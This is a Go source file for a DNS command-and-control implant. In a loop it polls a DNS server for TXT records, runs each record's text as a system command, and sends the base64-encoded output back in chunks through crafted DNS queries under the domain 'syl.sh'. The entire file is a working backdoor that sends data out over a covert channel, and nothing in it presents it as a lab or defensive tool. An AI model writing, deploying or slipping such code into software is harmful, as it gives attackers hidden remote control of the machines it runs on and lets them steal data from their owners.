package main

import (
	"encoding/base64"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
)

const (
	host        = "127.0.0.1:8053"
	maxMsgLen   = 66
	metaInfoLen = 30
	delay       = 500 * time.Millisecond
)

var baseAnswerUri = "syl.sh"
var questionBeamUri = "137.137.137.137."

func main() {
	m := new(dns.Msg)
	m.SetQuestion(questionBeamUri, dns.TypeTXT)

	for {
		r, _ := dns.Exchange(m, host)
		if r != nil {
			for _, a := range r.Answer {
				if txt, ok := a.(*dns.TXT); ok {
					if txt.Txt[0] == "" {
						break
					}

					cmd := strings.Split(txt.Txt[0], " ")
					cmdToExecute := cmd[0]
					cmdArgs := cmd[1:]

					nm := new(dns.Msg)

					out, err := exec.Command(cmdToExecute, cmdArgs...).CombinedOutput()
					if err != nil {
						out = []byte(" ")
					}
					outEnc := base64.StdEncoding.EncodeToString(out)

					// Add Space for META info, this is for the `cs=2&cc=1`
					// usually this requires ~12 chars, we put it on 20 as a default
					// for a larger messages.
					dataLeft := (maxMsgLen - len(baseAnswerUri)) - metaInfoLen

					chunks := Chunks(outEnc, dataLeft)
					for i, chunkOut := range chunks {
						chunkLen := strconv.Itoa(len(chunks))
						currentChunk := strconv.Itoa((i + 1))

						// Build the Chunk URL
						chunkUrl := baseAnswerUri +
							"?" + "cs=" + chunkLen +
							"&" + "cc=" + currentChunk +
							"&" + "o=" + chunkOut +
							"."

						nm.SetQuestion(chunkUrl, dns.TypeTXT)
						dns.Exchange(nm, host)
					}
				}
			}
		}
		time.Sleep(delay)
	}
}

func Chunks(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}
